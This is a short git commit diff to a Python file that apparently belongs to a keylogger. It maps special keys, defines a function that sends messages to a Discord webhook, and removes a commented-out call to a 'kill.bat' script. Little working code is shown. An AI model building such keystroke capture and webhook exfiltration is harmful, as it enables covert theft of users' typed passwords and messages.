6d833181f9d61440a2215a45bcfbd45a9d10a21f
henrycsharp <151407721+Henrycsharp@users.noreply.github.com>
2025-03-10 20:54:19 +0100

    Update main.py

--- main.py
+++ main.py
@@ -24,12 +24,6 @@ special_keys = {
     keyboard.Key.esc: "ESC",
 }
 
-'''
-username = os.getlogin()
-bat_file_path = f"C:\Users\{username}\kl2\kill.bat"
-subprocess.run([bat_file_path], shell=True)
-'''
-
 
 def send_to_webhook(message):
     """Send the message to the Discord webhook."""
